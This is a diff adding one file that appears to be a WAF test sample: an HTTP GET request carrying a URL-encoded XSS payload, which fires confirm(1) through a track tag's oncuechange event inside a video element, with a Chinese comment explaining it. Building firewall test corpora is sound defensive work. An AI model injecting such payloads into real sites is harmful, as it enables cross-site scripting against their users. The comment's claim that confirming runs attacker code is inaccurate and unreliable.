@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_track标签_oncuechange事件-06506517
+# 攻击者通过在 "oncuechange" 属性中注入恶意代码，使得当浏览器播放视频时，会执行确认框的脚本，其内容为 "confirm(1)"，这将返回一个布尔值，如果用户点击了确认按钮，则该值将为 true，从而执行攻击者的代码。此外，攻击者在 payload 中还使用了一些隐藏的 HTML 标签和属性，如 "<track>" 和 "default"，以及 "oncuechange" 事件，这些内容在浏览器中不会直接显示，但可以被浏览器解析和执行。字幕改变时触发。
+GET /?id=%3Cvideo%20controls%3E%3Csource%20src%253Dvalidvideo.mp4%20type%253Dvideo%252Fmp4%3E%3Ctrack%20default%20oncuechange%253Dconfirm%281%29%20src%253D%22data%253Atext%252Fvtt%252CWEBVTT%20FILE%250A%250A1%250A00%253A00%253A00.000%20--%3E%2000%253A00%253A05.000%20%250A%3Cb%3EXSS%3C%252Fb%3E%250A%22%3E%3C%252Fvideo%3E&bid=hd_tag_m8mv26ct HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26ct
+RM-PRO-Token: 370f543c60e35e5dfb2e0b99971d5276
+RM-PRO-Time: 1742808582189
+User-Agent: curl/7.83.1
+
